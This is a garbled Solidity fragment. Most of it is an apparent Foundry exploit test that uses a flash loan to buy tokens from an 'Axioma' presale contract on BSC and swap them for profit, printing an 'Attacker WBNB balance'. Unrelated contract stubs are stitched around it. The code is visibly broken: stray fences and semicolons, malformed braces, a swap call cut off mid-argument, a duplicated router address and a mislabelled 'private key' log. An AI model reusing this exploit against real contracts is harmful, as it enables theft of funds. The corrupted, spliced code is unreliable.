
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
interface IAxiomaPresale {
    function buyToken() external payable};
contract ContractTest is Test {
    address axt = 0xB6CF5b77B92a722bF34f6f5D6B1Fe4700908935E;
    address axiomaPresale = 0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3;
    address axt_wbnb_pair = 0x6a3Fa7D2C71fd7D44BF3a2890aA257F34083c90f;
    address payable pancakeRouter = payable(0x10ED43C718714eb63d5aA5674BC2d1A72B5D8E3);
    address wbnb_usdt_b = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    function setUp() public {
        vm.createSelectFork("bsc", 27620321 - 1)};
    function testExploit() public {
        uint256 flashLoanAmount = 32500000000000000000;
        address wbnb = DVM(wbnb_usdt_b)._BASE_TOKEN_();
        DVM(wbnb_usdt_b).flashLoan(flashLoanAmount, 0, address(this), abi.encode(wbnb_usdt_b, wbnb, flashLoanAmount))};
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        (address wbnb_usdt_b, address wbnb, uint256 flashLoanAmount) = abi.decode(data, (address, address, uint256));
        WETH(wbnb).withdraw(flashLoanAmount);
        IAxiomaPresale(axiomaPresale).buyToken{value: flashLoanAmount}();
        uint256 axtBalance = IERC20(axt).balanceOf(address(this));
        bscSwap(axt, wbnb, axtBalance);
        IERC20(wbnb).transfer(msg.sender, flashLoanAmount);
        uint256 profit = IERC20(wbnb).balanceOf(address(this));
        emit log_named_decimal_uint("[After Attacks]  Attacker WBNB balance", profit, 18);
        emit log_named_address_uint("[After Attacks]  Attacker Private Key", IERC20(wbnb).balanceOf(address(this)), 0)};
    fallback() external payable {};
    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(pancakeRouter, type(uint).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        IUniswapV2Router(pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
function publicQuery() public view returns (bytes memory) {
    return internalEncryptedStorage[msg.sender];}